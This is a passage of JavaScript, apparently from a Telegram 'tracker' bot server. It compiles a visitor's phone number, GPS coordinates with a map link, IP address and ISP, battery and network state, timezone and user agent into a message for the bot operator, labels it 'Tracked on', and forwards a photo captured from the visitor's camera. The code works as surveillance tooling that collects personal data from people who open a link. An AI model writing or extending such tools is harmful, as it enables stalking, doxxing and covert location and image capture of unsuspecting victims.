// ============================
lines.push('');
lines.push('☎️ Number Submitted');
if (data?.msisdn) {
lines.push(`📱 Mobile number: ${data.msisdn}`);
} else {
lines.push('📱 Mobile number: N/A');
}


if (ipInfo.isp) {
lines.push(`📡 Operator: ${ipInfo.isp}`);
}


lines.push('');
lines.push('📍 Location:');
lines.push(`Latitude: ${lat ?? 'N/A'}`);
lines.push(`Longitude: ${lon ?? 'N/A'}`);
if (lat && lon) lines.push(`🌍 View on Map (https://www.google.com/maps?q=${lat},${lon})`);


lines.push('');
lines.push(`📸 Camera: ${consent.photoTaken ? 'Photo captured successfully' : 'No photo (not provided)'}`);


lines.push('');
lines.push('🌎 Ip Information:');
const ipShown = ipInfo.query || ip || 'N/A';
lines.push(`🌐 Ip address: ${ipShown} (https://ip-api.com/#${ipShown})`);
if (ipInfo.isp) lines.push(`📡 ISP: ${ipInfo.isp}`);
if (ipInfo.as) lines.push(`🔍 ASN: ${ipInfo.as}`);


lines.push('');
lines.push('📱 Device Info:');
lines.push(`🔋 Charging: ${mapBadge(charging)}`);
if (batteryLevel !== null) lines.push(`🔌 Battery Level: ${batteryLevel}%`);
lines.push(`🌐 Network Type: ${networkType}`);
lines.push(`🕒 Time Zone: ${timezone}`);


lines.push('');
lines.push(`🖥️ User Agent: ${userAgent}`);
lines.push('');
lines.push(`📱 Device Type: ${deviceType}`);


lines.push('');
lines.push(`👨‍💻 Tracked on: @${process.env.BOT_USERNAME || 'your_bot'}`);


const text = lines.join('\n');


await bot2.telegram.sendMessage(chatId, text, { disable_web_page_preview: true });


// If a snapshot was sent, forward as photo
if (data?.photoDataUrl && /^data:image\/(png|jpeg);base64,/.test(data.photoDataUrl)) {
await bot2.telegram.sendPhoto(chatId, data.photoDataUrl, {
caption: `📸 Camera snapshot — request: ${requestId}`,
});
}


return res.json({ ok: true });
} catch (e) {
console.error('collect error', e);
return res.status(500).json({ ok: false, error: 'SERVER_ERROR' });
}
});


module.exports = app2;
